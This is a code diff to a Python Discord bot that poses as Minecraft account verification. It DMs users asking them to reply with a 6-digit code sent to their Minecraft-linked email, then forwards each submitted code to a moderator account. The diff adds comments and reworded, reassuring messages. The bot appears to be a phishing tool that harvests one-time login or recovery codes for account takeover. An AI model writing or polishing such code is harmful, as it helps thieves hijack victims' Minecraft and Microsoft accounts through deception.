@@ -42,13 +42,15 @@ async def send_verification_embed():
     global last_verification_msg_id
     channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
 
+    # Check if there's an old verification embed and delete it
     if last_verification_msg_id:
         try:
             old = await channel.fetch_message(last_verification_msg_id)
             await old.delete()
         except:
-            pass
+            pass  # Ignore errors if the message doesn’t exist (it could be deleted manually)
 
+    # Create and send the new verification embed
     embed = discord.Embed(
         title="🔗 Link Your Minecraft Account",
         description="Click the button below to verify.",
@@ -73,21 +75,23 @@ async def promptcode(interaction: discord.Interaction, user: discord.Member):
     if user.id in sent_verification_dms:
         await interaction.response.send_message("✅ Already sent the prompt.", ephemeral=True)
         return
-
+    
     try:
         embed = discord.Embed(
             title="📨 Minecraft Server Verification",
-            description=(
+            description=( 
                 "We've sent a 6-digit code to your email linked to Minecraft.\n\n"
                 "Reply to this DM with the code to complete verification.\n\n"
-                "🔒 Your info is private."
+                "🔒 Your info is private. Don't share your code."
             ),
             color=discord.Color.blue()
         )
         await user.send(embed=embed)
         sent_verification_dms.add(user.id)
+        # Acknowledge the interaction after the DM is successfully sent
         await interaction.response.send_message("✅ Prompt sent.", ephemeral=True)
     except discord.errors.Forbidden:
+        # Handle the case where the bot can't send a DM
         await interaction.response.send_message("❌ Couldn't send DM. Please make sure your DMs are open.", ephemeral=True)
 
 @bot.event
@@ -104,10 +108,10 @@ async def on_message(message: discord.Message):
                 color=discord.Color.teal()
             )
             await mod.send(embed=embed)
-
+            # Send confirmation embed for code submission
             confirm_embed = discord.Embed(
                 title="✅ Code Received",
-                description="Your code was submitted successfully. Please wait up to 3 minutes to receive your role.",
+                description="A mod will review your code shortly.",
                 color=discord.Color.green()
             )
             await message.channel.send(embed=confirm_embed)
